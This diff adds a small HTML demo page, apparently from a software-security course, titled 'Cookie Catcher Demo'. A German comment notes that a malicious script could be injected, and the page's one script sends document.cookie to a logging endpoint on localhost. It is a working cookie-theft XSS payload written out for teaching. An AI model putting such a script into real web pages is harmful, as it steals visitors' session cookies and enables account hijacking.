@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Cookie Catcher Demo</title>
+</head>
+<body>
+  <h1>Willkommen auf der Test-Seite</h1>
+  
+  <!-- Hier könnte ein bösartiges Script eingeschleust werden -->
+  <script>
+    new Image().src = "http://localhost/SWSEC/log.php?cookie=" + document.cookie;
+  </script>
+  
+</body>
+</html>
